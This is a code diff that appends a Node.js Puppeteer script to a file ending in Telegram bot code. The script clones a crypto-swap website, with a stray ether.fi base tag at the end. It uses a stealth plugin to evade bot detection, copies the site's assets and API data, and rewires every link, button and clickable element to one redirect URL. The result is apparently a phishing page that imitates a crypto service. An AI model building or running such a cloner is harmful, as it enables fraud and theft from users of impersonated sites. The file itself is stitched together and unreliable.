@@ -962,3 +962,524 @@ bot.launch().then(() => {
   console.log("🤖 Bot is running...");
 });
 console.log("🤖 Bot is running...");
+
+
+
+
+
+
+import puppeteer from "puppeteer-extra";
+import StealthPlugin from "puppeteer-extra-plugin-stealth";
+import * as cheerio from "cheerio";
+import fs from "fs-extra";
+import path from "path";
+import { URL } from "url";
+
+puppeteer.use(StealthPlugin());
+
+async function scrape() {
+  const siteUrl = "https://ibroport.netlify.app/";
+  const outputDir = path.join(process.cwd(), "cloned");
+  const redirectURL = "https://google.com";
+  const originalDomain = new URL(siteUrl).origin;
+
+  try {
+    // Ensure output directories exist
+    await fs.ensureDir(path.join(outputDir, "css"));
+    await fs.ensureDir(path.join(outputDir, "js"));
+    await fs.ensureDir(path.join(outputDir, "images"));
+    await fs.ensureDir(path.join(outputDir, "api"));
+    await fs.ensureDir(path.join(outputDir, "resources"));
+
+    // Launch Puppeteer
+    const browser = await puppeteer.launch({
+      headless: true,
+      args: ["--no-sandbox", "--disable-setuid-sandbox"],
+    });
+    const page = await browser.newPage();
+
+    // Set user agent and viewport
+    await page.setUserAgent(
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    );
+    await page.setViewport({ width: 1280, height: 720 });
+
+    // Single request interception handler
+    const apiResponses = {};
+    const additionalScripts = new Set();
+    const additionalImages = new Set();
+    const additionalResources = new Set();
+    await page.setRequestInterception(true);
+    page.on("request", (request) => {
+      const resourceType = request.resourceType();
+      const url = request.url();
+      // Block navigations
+      if (["document", "xhr", "fetch"].includes(resourceType) && url !== siteUrl) {
+        console.log("🚫 Blocking navigation:", url);
+        request.abort();
+        return;
+      }
+      // Capture resources
+      if (resourceType === "xhr" || resourceType === "fetch") {
+        console.log("🌐 API Request:", url);
+      } else if (resourceType === "script") {
+        console.log("📜 Script Request:", url);
+        additionalScripts.add(url);
+      } else if (resourceType === "image") {
+        console.log("🖼️ Image Request:", url);
+        additionalImages.add(url);
+      } else if (["other", "media"].includes(resourceType)) {
+        console.log("📦 Resource Request:", url);
+        additionalResources.add(url);
+      }
+      request.continue();
+    });
+
+    page.on("response", async (response) => {
+      const resourceType = response.request().resourceType();
+      const url = response.url();
+      if (resourceType === "xhr" || resourceType === "fetch") {
+        try {
+          const json = await response.json();
+          apiResponses[url] = json;
+          console.log("📦 API Response:", url, JSON.stringify(json).slice(0, 100) + "...");
+          const fileName = `api-${Date.now()}-${url.split("/").pop() || "data"}.json`;
+          await fs.outputFile(path.join(outputDir, "api", fileName), JSON.stringify(json, null, 2));
+        } catch (err) {}
+      }
+    });
+
+    // Monitor DOM changes for dynamic scripts and images
+    await page.evaluateOnNewDocument(() => {
+      const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+          if (mutation.addedNodes.length) {
+            console.log("🔍 DOM Change: New nodes added");
+            mutation.addedNodes.forEach((node) => {
+              if (node.tagName === "SCRIPT" && node.src) {
+                console.log("📜 Dynamically added script:", node.src);
+                window.__DYNAMIC_SCRIPTS__ = window.__DYNAMIC_SCRIPTS__ || [];
+                window.__DYNAMIC_SCRIPTS__.push(node.src);
+              }
+              if (node.tagName === "IMG" && (node.src || node.getAttribute("data-src") || node.getAttribute("data-lazy-src"))) {
+                const src = node.src || node.getAttribute("data-src") || node.getAttribute("data-lazy-src");
+                console.log("🖼️ Dynamically added image:", src);
+                window.__DYNAMIC_IMAGES__ = window.__DYNAMIC_IMAGES__ || [];
+                window.__DYNAMIC_IMAGES__.push(src);
+              }
+            });
+          }
+        });
+      });
+      observer.observe(document, { childList: true, subtree: true });
+    });
+
+    // Navigate and wait for page to stabilize
+    console.log(`Navigating to ${siteUrl}...`);
+    await page.goto(siteUrl, { waitUntil: "networkidle2", timeout: 60000 });
+
+    // Wait for dynamic content
+    try {
+      await page.waitForSelector(
+        "#__next, main, .container, [data-testid], .dynamic-content, .swap-form, .price-chart, .logo",
+        { timeout: 30000 }
+      );
+      console.log("✅ Initial dynamic content detected");
+
+      // Trigger interactions safely
+      await page.evaluate(() => {
+        document.querySelectorAll("img, [data-lazy-src], [data-src]").forEach((el) => {
+          el.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
+        });
+      });
+
+      // Wait for lazy-loaded content
+      let previousHeight = await page.evaluate(() => document.body.scrollHeight);
+      let attempts = 0;
+      while (attempts < 5) {
+        await page.waitForTimeout(3000);
+        const currentHeight = await page.evaluate(() => document.body.scrollHeight);
+        if (currentHeight > previousHeight) {
+          console.log("📈 Page height increased, more content loaded");
+          previousHeight = currentHeight;
+          attempts = 0;
+        } else {
+          attempts++;
+        }
+        await page.evaluate(() => window.scrollBy(0, document.body.scrollHeight));
+      }
+      console.log("✅ Dynamic content loading complete");
+    } catch (err) {
+      console.warn("⚠️ Dynamic selector not found, proceeding with available content:", err.message);
+    }
+
+    // Retrieve dynamic scripts and images with retry
+    let dynamicScripts = [];
+    let dynamicImages = [];
+    for (let attempt = 0; attempt < 3; attempt++) {
+      try {
+        dynamicScripts = await page.evaluate(() => window.__DYNAMIC_SCRIPTS__ || []);
+        dynamicImages = await page.evaluate(() => window.__DYNAMIC_IMAGES__ || []);
+        break;
+      } catch (err) {
+        console.warn(`⚠️ Retry ${attempt + 1}/3 for dynamic scripts/images: ${err.message}`);
+        await page.waitForTimeout(1000);
+      }
+    }
+    dynamicScripts.forEach((src) => additionalScripts.add(src));
+    dynamicImages.forEach((src) => additionalImages.add(src));
+
+    // Debug DOM content
+    const dynamicElements = await page.evaluate(() => {
+      return {
+        nextRoot: !!document.querySelector("#__next"),
+        main: !!document.querySelector("main"),
+        dynamic: document.querySelectorAll("[data-testid], .dynamic-content, .swap-form, .price-chart, .logo").length,
+        allElements: document.querySelectorAll("*").length,
+        scripts: Array.from(document.querySelectorAll("script[src]")).map((s) => s.src),
+        images: Array.from(document.querySelectorAll("img[src], img[data-src], img[data-lazy-src]")).map(
+          (img) => img.src || img.getAttribute("data-src") || img.getAttribute("data-lazy-src")
+        ),
+      };
+    });
+    console.log("🕵️‍♂️ DOM Debug:", dynamicElements);
+
+    const html = await page.content();
+    const $ = cheerio.load(html);
+    const baseHref = originalDomain;
+
+    // Save External CSS
+    const cssLinks = $('link[rel="stylesheet"]');
+    for (const el of cssLinks.toArray()) {
+      const href = $(el).attr("href");
+      if (href && !href.startsWith("data:")) {
+        try {
+          const fullUrl = new URL(href, baseHref).href;
+          const response = await page.goto(fullUrl, { waitUntil: "networkidle0", timeout: 15000 });
+          const data = await response.text();
+          const fileName = path.basename(new URL(href, baseHref).pathname).split("?")[0] || `style-${Date.now()}.css`;
+          const filePath = path.join("css", fileName);
+          await fs.outputFile(path.join(outputDir, filePath), data);
+          $(el).attr("href", `css/${fileName}`);
+          console.log("📁 Saved CSS:", filePath);
+        } catch (err) {
+          console.warn("⚠️ Failed to fetch CSS:", href, err.message);
+          $(el).remove();
+        }
+      }
+    }
+
+    // Save External JS
+    const scripts = new Set([...$('script[src]').toArray().map((el) => $(el).attr("src")), ...additionalScripts]);
+    for (const src of scripts) {
+      if (src && !src.startsWith("data:")) {
+        try {
+          const fullUrl = new URL(src, baseHref).href;
+          console.log(`Processing script: src=${src}, fullUrl=${fullUrl}`);
+          const response = await page.goto(fullUrl, { waitUntil: "networkidle0", timeout: 30000 });
+          let scriptContent = await response.text();
+          scriptContent = scriptContent
+            .replace(/history\.replaceState/g, "/*history.replaceState*/")
+            .replace(/history\.pushState/g, "/*history.pushState*/")
+            .replace(new RegExp(originalDomain, "g"), "");
+          const fileName = path.basename(new URL(fullUrl).pathname).split("?")[0] || `script-${Date.now()}.js`;
+          const filePath = path.join("js", fileName);
+          await fs.outputFile(path.join(outputDir, filePath), scriptContent);
+          $(`script[src="${src}"]`).attr("src", `js/${fileName}`);
+          console.log(`📁 Saved JS: ${filePath}`);
+        } catch (err) {
+          console.warn(`⚠️ Failed to fetch JS: ${src}, error: ${err.message}`);
+          $(`script[src="${src}"]`).attr("src", "");
+        }
+      }
+    }
+
+    // Preserve Inline Scripts and Update Image References
+    $("script:not([src])").each((_, el) => {
+      let scriptContent = $(el).html();
+      scriptContent = scriptContent
+        .replace(/history\.replaceState/g, "/*history.replaceState*/")
+        .replace(/history\.pushState/g, "/*history.pushState*/")
+        .replace(new RegExp(originalDomain, "g"), "")
+        .replace(/\/static\/media\/[^"]+\.(svg|png|jpg|jpeg|gif|webp)/g, (match) => {
+          const baseName = match.includes("Untitled") ? "Untitled" : match.split(".")[0].split("/").pop();
+          const ext = path.extname(match);
+          return `images/${baseName}${ext}`;
+        });
+      $(el).html(scriptContent);
+    });
+
+    // Download Additional Resources
+    const resourceExtToDir = {
+      ".json": "resources",
+      ".gltf": "resources",
+      ".glb": "resources",
+      ".bin": "resources",
+    };
+    for (const resourceUrl of additionalResources) {
+      if (resourceUrl && !resourceUrl.startsWith("data:")) {
+        try {
+          const fullUrl = new URL(resourceUrl, baseHref).href;
+          const response = await page.goto(fullUrl, { waitUntil: "networkidle0", timeout: 30000 });
+          const data = await response.buffer();
+          const ext = path.extname(new URL(fullUrl).pathname) || ".bin";
+          const dir = resourceExtToDir[ext] || "resources";
+          const fileName = path.basename(new URL(fullUrl).pathname).split("?")[0] || `resource-${Date.now()}${ext}`;
+          const filePath = path.join(dir, fileName);
+          await fs.outputFile(path.join(outputDir, filePath), data);
+          console.log(`📁 Saved Resource: ${filePath}`);
+          $("script").each((_, el) => {
+            let content = $(el).html();
+            if (content.includes(fullUrl)) {
+              content = content.replace(fullUrl, `${dir}/${fileName}`);
+              $(el).html(content);
+            }
+          });
+        } catch (err) {
+          console.warn(`⚠️ Failed to fetch resource: ${resourceUrl}, error: ${err.message}`);
+        }
+      }
+    }
+
+    // Download Images Locally
+    const mimeToExt = {
+      "image/png": ".png",
+      "image/jpeg": ".jpg",
+      "image/webp": ".webp",
+      "image/gif": ".gif",
+      "image/svg+xml": ".svg",
+    };
+
+    const seenFileNames = new Set();
+    const getUniqueFileName = (baseName, ext) => {
+      let fileName = baseName + ext;
+      let counter = 1;
+      while (seenFileNames.has(fileName)) {
+        fileName = `${baseName}-${counter}${ext}`;
+        counter++;
+      }
+      seenFileNames.add(fileName);
+      return fileName;
+    };
+
+    const fetchImageWithPuppeteer = async (page, url) => {
+      const imagePage = await page.browser().newPage();
+      try {
+        const response = await imagePage.goto(url, { waitUntil: "networkidle0", timeout: 30000 });
+        const buffer = await response.buffer();
+        const headers = response.headers();
+        await imagePage.close();
+        return { data: buffer, headers };
+      } catch (err) {
+        await imagePage.close();
+        throw err;
+      }
+    };
+
+    const getRawImageUrl = (url, baseHref) => {
+      try {
+        const fullUrl = new URL(url, baseHref).href;
+        console.log(`Resolved image URL: ${url} -> ${fullUrl}`);
+        return fullUrl;
+      } catch (err) {
+        console.warn(`⚠️ Invalid URL: ${url}, error: ${err.message}`);
+        return null;
+      }
+    };
+
+    // Collect images
+    const imageSources = new Set([
+      ...$('img[src]').toArray().map((el) => $(el).attr("src")),
+      ...$('img[data-src]').toArray().map((el) => $(el).attr("data-src")),
+      ...$('img[data-lazy-src]').toArray().map((el) => $(el).attr("data-lazy-src")),
+      ...additionalImages,
+      ...dynamicImages,
+    ]);
+
+    for (const src of imageSources) {
+      if (src && !src.startsWith("data:") && src.trim() !== "") {
+        try {
+          let fullUrl = getRawImageUrl(src, baseHref);
+          if (!fullUrl) {
+            throw new Error(`No valid image URL for src=${src}`);
+          }
+
+          console.log(`Processing image: src=${src}, fullUrl=${fullUrl}`);
+
+          const response = await fetchImageWithPuppeteer(page, fullUrl);
+          const contentType = response.headers["content-type"] || "image/jpeg";
+          const urlExt = path.extname(new URL(fullUrl).pathname).toLowerCase();
+          const ext = mimeToExt[contentType] || (urlExt && [".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp"].includes(urlExt) ? urlExt : ".jpg");
+          let baseName = path.basename(new URL(fullUrl).pathname).split("?")[0];
+          baseName = baseName.includes(".") ? baseName.split(".")[0] : `image-${Date.now()}`;
+
+          // Special handling for logo SVG
+          if (src.includes("/static/media/Untitled") && ext === ".svg") {
+            baseName = "Untitled";
+          }
+
+          const fileName = getUniqueFileName(baseName, ext);
+          const filePath = path.join("images", fileName);
+
+          console.log(`Saving image to: ${path.join(outputDir, filePath)}`);
+          await fs.outputFile(path.join(outputDir, filePath), response.data);
+
+          // Update img tags
+          $(`img[src="${src}"], img[data-src="${src}"], img[data-lazy-src="${src}"]`).each((_, el) => {
+            $(el).attr("src", `images/${fileName}`);
+            $(el).removeAttr("data-src");
+            $(el).removeAttr("data-lazy-src");
+            const srcset = $(el).attr("srcset");
+            if (srcset) {
+              const newSrcset = srcset
+                .split(",")
+                .map((entry) => {
+                  const [_, descriptor] = entry.trim().split(" ");
+                  return `images/${fileName} ${descriptor || "1x"}`;
+                })
+                .join(", ");
+              $(el).attr("srcset", newSrcset);
+            }
+          });
+
+          // Update inline styles
+          $("[style]").each((_, el) => {
+            let style = $(el).attr("style");
+            if (style && style.includes(src)) {
+              style = style.replace(src, `images/${fileName}`);
+              $(el).attr("style", style);
+            }
+          });
+
+          console.log(`📁 Saved Image: ${filePath}`);
+        } catch (err) {
+          console.warn(`⚠️ Failed to fetch or process image: src=${src}, error: ${err.message}`);
+          $(`img[src="${src}"], img[data-src="${src}"], img[data-lazy-src="${src}"]`).attr("src", src);
+        }
+      } else {
+        console.log(`Skipping invalid or empty image src: ${src}`);
+        $(`img[src="${src}"], img[data-src="${src}"], img[data-lazy-src="${src}"]`).attr("src", "");
+      }
+    }
+
+    // Inject API Responses and Mock Fetch
+    const apiScript = `
+      <script>
+        window.__API_RESPONSES__ = ${JSON.stringify(apiResponses)};
+        console.log("Injected API Responses:", Object.keys(window.__API_RESPONSES__));
+        const originalFetch = window.fetch;
+        window.fetch = async (url, ...args) => {
+          if (window.__API_RESPONSES__[url]) {
+            console.log("Mocking fetch for:", url);
+            return Promise.resolve({
+              ok: true,
+              json: () => Promise.resolve(window.__API_RESPONSES__[url]),
+            });
+          }
+          return originalFetch(url, ...args);
+        };
+      </script>
+    `;
+    $.root().append(apiScript);
+
+    // Add Error Logging
+    $.root().append(`
+      <script>
+        window.onerror = (msg, url, line) => {
+          console.error("JS Error:", msg, "at", url, "line", line);
+          return false;
+        };
+        document.querySelectorAll('img').forEach(img => {
+          img.onerror = () => console.error('Failed to load image:', img.src);
+          img.onload = () => console.log('Loaded image:', img.src);
+        });
+        document.querySelectorAll('script[src]').forEach(script => {
+          script.onerror = () => console.error('Failed to load script:', script.src);
+          script.onload = () => console.log('Loaded script:', script.src);
+        });
+      </script>
+    `);
+
+    // Redirect all links
+    $("a[href]").each((_, el) => {
+      $(el).attr("href", redirectURL);
+      $(el).removeAttr("target");
+    });
+
+    // Redirect all buttons
+    const buttonCount = $("button").length;
+    $("button").each((_, el) => {
+      $(el).attr("onclick", `window.location='${redirectURL}'`);
+    });
+
+    // Handle cursor:pointer inline styles
+    let pointerCount = 0;
+    $("[style]").each((_, el) => {
+      const style = $(el).attr("style");
+      if (style && style.toLowerCase().includes("cursor: pointer")) {
+        $(el).attr("onclick", `window.location='${redirectURL}'`);
+        pointerCount++;
+      }
+    });
+
+    // Handle classes with cursor:pointer
+    const pointerClasses = new Set();
+    $("style").each((_, el) => {
+      const css = $(el).html();
+      const matches = css?.match(/\.([\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi);
+      if (matches) {
+        matches.forEach((rule) => {
+          const classMatch = rule.match(/\.([\w-]*)/);
+          if (classMatch) pointerClasses.add(classMatch[1]);
+        });
+      }
+    });
+
+    for (const className of pointerClasses) {
+      $(`.${className}`).attr("onclick", `window.location='${redirectURL}'`);
+      pointerCount += $(`.${className}`).length;
+    }
+
+    console.log("🎯 Pointer-style elements redirected:", pointerCount);
+    console.log("🔘 <button> elements redirected:", buttonCount);
+    console.log("🔗 <a> links replaced with:", redirectURL);
+
+    // Save Final HTML
+    await fs.outputFile(path.join(outputDir, "index.html"), $.html());
+    console.log("✅ Done! Saved at cloned/index.html");
+
+    await browser.close();
+    return {
+      success: true,
+      message: "Scraping completed",
+      output: "cloned/index.html",
+    };
+  } catch (err) {
+    console.error("❌ Scraping failed:", err.message, err.stack);
+    throw err;
+  }
+}
+
+// Execute the scrape function
+(async () => {
+  try {
+    const result = await scrape();
+    console.log(result.message, "Output:", result.output);
+    console.log("To view the cloned site, serve the 'cloned' directory with a local server:");
+    console.log("  npm install -g http-server");
+    console.log("  http-server ./cloned -p 8080");
+    console.log("Then open http://localhost:8080/index.html in your browser.");
+  } catch (err) {
+    console.error("Script execution failed:", err.message);
+    process.exit(1);
+  }
+})();
+
+
+    <base href="https://www.ether.fi">
+
+
+
+
+
+
